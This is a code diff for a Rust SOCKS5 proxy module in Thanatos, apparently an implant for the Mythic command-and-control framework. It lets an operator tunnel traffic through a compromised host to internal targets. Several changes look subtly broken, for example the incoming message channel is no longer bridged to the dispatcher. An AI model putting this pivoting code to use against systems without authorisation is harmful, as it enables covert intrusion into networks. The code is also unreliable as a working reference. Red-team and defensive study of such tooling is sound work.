@@ -1,9 +1,13 @@
+// Final SOCKS5 Agent-Side Handler for Mythic in Rust (Integrated for Thanatos)
 use base64::{decode, encode};
+use serde::Deserialize;
 use serde_json::{json, Value};
 use std::collections::HashMap;
 use std::error::Error;
 use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
-use std::sync::{Arc, Mutex};
+use std::sync::Arc;
+use std::sync::mpsc as std_mpsc;
+use std::sync::Mutex;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::sync::mpsc as tokio_mpsc;
@@ -11,8 +15,19 @@ use tokio::time::{timeout, Duration};
 use tokio_util::sync::CancellationToken;
 use once_cell::sync::Lazy;
 
+#[derive(Deserialize)]
+struct AgentTask {
+    id: String,
+    #[serde(default)]
+    command: Option<String>,
+    #[serde(default)]
+    parameters: Option<String>,
+}
+
 // Global channels and token for SOCKS integration across check-ins
-static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(tokio_mpsc::unbounded_channel::<Value>().0);
+static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(|| {
+    tokio_mpsc::unbounded_channel::<Value>().0
+});
 static SOCKS_OUT: Lazy<Arc<Mutex<Vec<Value>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
 static SOCKS_CANCEL: Lazy<CancellationToken> = Lazy::new(CancellationToken::new);
 
@@ -71,7 +86,7 @@ fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<d
         "data": encode(data),
         "exit": exit
     });
-    let mut out = SOCKS_OUT.lock()?;
+    let mut out = SOCKS_OUT.lock().unwrap();
     out.push(item);
     Ok(())
 }
@@ -158,7 +173,7 @@ async fn run_session(
     server_id: String,
     mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
-    debug_to_mythic(&parent_task_id, "socks.session.start", &server_id);
+    debug_to_mythic(&parent_task_id, "socks.session.start", format!("sid={}", server_id));
 
     // Get first frame
     let first = match sess_rx.recv().await {
@@ -170,50 +185,112 @@ async fn run_session(
     };
 
     let b64 = first["data"].as_str().unwrap_or("");
-    let mut buf = decode(b64)?;
+    let mut buf = match decode(b64) {
+        Ok(d) => d,
+        Err(e) => {
+            debug_to_mythic(&parent_task_id, "socks.decode.fail", format!("err={}", e));
+            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
+            return Ok(());
+        }
+    };
+
     debug_to_mythic(&parent_task_id, "socks.first", format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
 
+    // Handle optional greeting
     if looks_like_greeting(&buf) {
-        let sel = [0x05u8, 0x00u8];
+        let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
         send_socks_live(&server_id, &sel, false)?;
         debug_to_mythic(&parent_task_id, "socks.greeting.seen", "replied 05 00");
 
-        let nxt = sess_rx.recv().await.ok_or("No CONNECT after greeting")?;
+        // Wait for CONNECT
+        let nxt = match sess_rx.recv().await {
+            Some(v) => v,
+            None => {
+                debug_to_mythic(&parent_task_id, "socks.session.abort", "no CONNECT after greeting");
+                return Ok(());
+            }
+        };
         let b64 = nxt["data"].as_str().unwrap_or("");
-        buf = decode(b64)?;
-        debug_to_mythic(&parent_task_id, "socks.connect.req", format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
+        buf = match decode(b64) {
+            Ok(d) => d,
+            Err(e) => {
+                debug_to_mythic(&parent_task_id, "socks.decode.fail2", format!("err={}", e));
+                send_socks_live(&server_id, &build_reply(0x01, None), true)?;
+                return Ok(());
+            }
+        };
+        debug_to_mythic(&parent_task_id, "socks.connect.req.after_greet", format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
     }
 
-    let (addr, port, _) = parse_connect(&buf)?;
+    // Parse CONNECT
+    let (addr, port, _atyp) = match parse_connect(&buf) {
+        Ok(v) => v,
+        Err(e) => {
+            let rep = if e.to_string().contains("ATYP") { 0x08 } else { 0x07 };
+            debug_to_mythic(&parent_task_id, "socks.connect.parse_err", format!("err={}", e));
+            send_socks_live(&server_id, &build_reply(rep, None), true)?;
+            return Ok(());
+        }
+    };
+
     debug_to_mythic(&parent_task_id, "socks.connect.try", format!("target={}:{}", addr, port));
 
-    let remote = timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await??;
+    // Connect to destination
+    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr, port))).await {
+        Ok(Ok(s)) => s,
+        Ok(Err(e)) => {
+            let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
+                      else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
+                      else if e.to_string().to_lowercase().contains("unsupported") { 0x08 }
+                      else { 0x01 };
+            debug_to_mythic(&parent_task_id, "socks.connect.err", format!("rep=0x{:02x}; err={}", rep, e));
+            send_socks_live(&server_id, &build_reply(rep, None), true)?;
+            return Ok(());
+        }
+        Err(_) => {
+            debug_to_mythic(&parent_task_id, "socks.connect.timeout", "15s exceeded");
+            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
+            return Ok(());
+        }
+    };
 
     let local_addr = remote.local_addr().ok();
     let ok_reply = build_reply(0x00, local_addr);
     send_socks_live(&server_id, &ok_reply, false)?;
-    debug_to_mythic(&parent_task_id, "socks.connect.ok", format!("bound={:?}", local_addr));
+    debug_to_mythic(&parent_task_id, "socks.connect.ok", format!("bound={:?}; reply_hex={}", local_addr, hex_preview(&ok_reply, 22)));
 
     let (mut r_r, mut r_w) = remote.into_split();
 
-    // A2M: Read from remote, send to Mythic
+    // A2M: Agent to Mythic (remote read -> send to mythic)
     let sid_up = server_id.clone();
     let parent_up = parent_task_id.clone();
     let a2m = tokio::spawn(async move {
-        let mut buf = vec![0u8; 16384];
-        let mut total = 0u64;
+        let mut buf = vec![0u8; 16 * 1024];
+        let mut total: u64 = 0;
         loop {
-            match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
+            let result = timeout(Duration::from_secs(300), r_r.read(&mut buf)).await;
+            match result {
                 Ok(Ok(0)) => {
                     debug_to_mythic(&parent_up, "socks.a2m.eof", format!("total={}", total));
                     send_exit_live(&sid_up);
                     break;
                 }
                 Ok(Ok(n)) => {
-                    total += n as u64;
-                    send_socks_live(&sid_up, &buf[..n], false).ok();
+                    if n > 0 {
+                        total += n as u64;
+                        let _ = send_socks_live(&sid_up, &buf[..n], false);
+                        if total % (64 * 1024) == 0 {
+                            debug_to_mythic(&parent_up, "socks.a2m.progress", format!("sent_up={}", total));
+                        }
+                    }
                 }
-                _ => {
+                Ok(Err(e)) => {
+                    debug_to_mythic(&parent_up, "socks.a2m.read_err", format!("err={}", e));
+                    send_exit_live(&sid_up);
+                    break;
+                }
+                Err(_) => {
+                    debug_to_mythic(&parent_up, "socks.a2m.idle_timeout", format!("sent_up={}", total));
                     send_exit_live(&sid_up);
                     break;
                 }
@@ -221,40 +298,57 @@ async fn run_session(
         }
     });
 
-    // M2A: Receive from mythic, write to remote
+    // M2A: Mythic to Agent (recv from mythic -> write to remote)
     let sid_dn = server_id.clone();
     let parent_dn = parent_task_id.clone();
     let m2a = tokio::spawn(async move {
-        let mut total = 0u64;
+        let mut total: u64 = 0;
         while let Some(pkt) = sess_rx.recv().await {
-            if pkt["exit"].as_bool().unwrap_or(false) {
-                debug_to_mythic(&parent_dn, "socks.m2a.exit", format!("total={}", total));
+            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
+            if exit {
+                debug_to_mythic(&parent_dn, "socks.m2a.exit", format!("total_written={}", total));
                 let _ = r_w.shutdown().await;
                 break;
             }
-            let data = decode(pkt["data"].as_str().unwrap_or(""))?;
-            if !data.is_empty() {
-                total += data.len() as u64;
-                timeout(Duration::from_secs(60), r_w.write_all(&data)).await.ok();
+            let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
+            let bytes = match decode(data_b64) {
+                Ok(b) => b,
+                Err(e) => {
+                    debug_to_mythic(&parent_dn, "socks.m2a.b64_err", format!("err={}", e));
+                    continue;
+                }
+            };
+            if !bytes.is_empty() {
+                total += bytes.len() as u64;
+                let write_result = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
+                if let Err(e) = write_result {
+                    debug_to_mythic(&parent_dn, "socks.m2a.write_err", format!("err={}", e));
+                    break;
+                }
+                if total % (64 * 1024) == 0 {
+                    debug_to_mythic(&parent_dn, "socks.m2a.progress", format!("wrote_down={}", total));
+                }
             }
         }
         let _ = r_w.shutdown().await;
     });
 
-    a2m.await?;
-    m2a.await?;
+    let _ = a2m.await;
+    let _ = m2a.await;
 
-    debug_to_mythic(&parent_task_id, "socks.session.end", &server_id);
+    debug_to_mythic(&parent_task_id, "socks.session.end", format!("sid={}", server_id));
     Ok(())
 }
 
 /* --------------------------------- Dispatcher ----------------------------- */
 
-pub fn start_socks_dispatcher() {
+pub fn start_socks_dispatcher(task_id: String) {
     let rt = tokio::runtime::Runtime::new().unwrap();
     rt.block_on(async {
         let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
-        let mut seen = 0u64;
+        let mut seen: u64 = 0;
+
+        debug_to_mythic(&task_id, "socks.dispatcher.run", "awaiting items");
 
         loop {
             tokio::select! {
@@ -262,23 +356,40 @@ pub fn start_socks_dispatcher() {
                     seen += 1;
                     let sid = item["server_id"].as_str().unwrap_or("").to_string();
                     let exit = item["exit"].as_bool().unwrap_or(false);
+                    let data_len_b64 = item["data"].as_str().map(|s| s.len()).unwrap_or(0);
+
+                    if seen <= 5 || seen % 100 == 0 {
+                        debug_to_mythic(&task_id, "socks.dispatcher.item", format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64));
+                    }
 
                     let entry = sessions.entry(sid.clone()).or_insert_with(|| {
-                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
+                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
+                        let task_clone = task_id.clone();
                         let sid_clone = sid.clone();
                         tokio::spawn(async move {
-                            run_session("global".to_string(), sid_clone, sess_rx).await.ok();
+                            let _ = run_session(task_clone, sid_clone, sess_rx).await;
                         });
                         sess_tx
                     });
 
-                    if entry.send(item).is_err() || exit {
+                    if entry.send(item).is_err() {
                         sessions.remove(&sid);
+                        debug_to_mythic(&task_id, "socks.dispatcher.drop_dead", format!("sid={}", sid));
+                    }
+
+                    if exit {
+                        sessions.remove(&sid);
+                        debug_to_mythic(&task_id, "socks.dispatcher.exit", format!("sid={}", sid));
                     }
                 }
-                _ = SOCKS_CANCEL.cancelled() => break,
+                _ = SOCKS_CANCEL.cancelled() => {
+                    debug_to_mythic(&task_id, "socks.dispatcher.cancelled", "Shutting down");
+                    break;
+                }
             }
         }
+
+        debug_to_mythic(&task_id, "socks.dispatcher.end", "bridge closed");
         sessions.clear();
     });
 }
@@ -286,7 +397,6 @@ pub fn start_socks_dispatcher() {
 /* --------------------------------- Entry ---------------------------------- */
 
 pub fn handle_socks(
-    tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
     // First message should be the AgentTask envelope (blocking)
@@ -301,63 +411,22 @@ pub fn handle_socks(
     };
     let action = params.get("action").and_then(|v| v.as_str()).unwrap_or("start");
 
-    debug_to_mythic(tx, &task.id, "socks.handler.start", format!("action={}", action));
+    debug_to_mythic(&task.id, "socks.handler", format!("action={}", action));
 
     if action == "stop" {
-        // For stop, send cancellation or drop channels; here assume global token
-        let token = CancellationToken::new();  // Assume shared token
-        token.cancel();
-        debug_to_mythic(tx, &task.id, "socks.handler.stop", "Dispatcher cancelled");
+        SOCKS_CANCEL.cancel();
+        debug_to_mythic(&task.id, "socks.handler.stop", "Dispatcher cancelled");
         return Ok(());
     }
 
-    // For start, proceed with dispatcher (add token for cancellation)
-    let token = CancellationToken::new();  // Share this for stop
-
-    // Bridge std::mpsc -> tokio::mpsc for async processing
-    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
-    {
-        let parent_id = task.id.clone();
-        let tx_dbg = tx.clone();
-        std::thread::spawn(move || {
-            debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.spawn", "blocking→async started");
-            while let Ok(v) = rx.recv() {
-                // ... (unchanged)
-            }
-            debug_to_mythic(&tx_dbg, &parent_id, "socks.bridge.end", "blocking receiver closed");
-        });
-    }
-
-    let rt = tokio::runtime::Runtime::new()?;
-    rt.block_on(async {
-        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
-        let parent_task_id = task.id.clone();
-        let mut seen: u64 = 0;
-
-        debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.run", "awaiting items");
-
-        loop {
-            tokio::select! {
-                Some(item) = bridge_rx.recv() => {
-                    // ... (unchanged processing)
-                }
-                _ = token.cancelled() => {
-                    debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.cancelled", "Shutting down");
-                    break;
-                }
-            }
-        }
-
-        debug_to_mythic(tx, &parent_task_id, "socks.dispatcher.end", "bridge closed");
-        sessions.clear();
-    });
+    // Start the dispatcher for "start"
+    start_socks_dispatcher(task.id);
 
     Ok(())
 }
 
 pub fn setup_socks(
-    tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
-    handle_socks(tx, rx)
+    handle_socks(rx)
 }
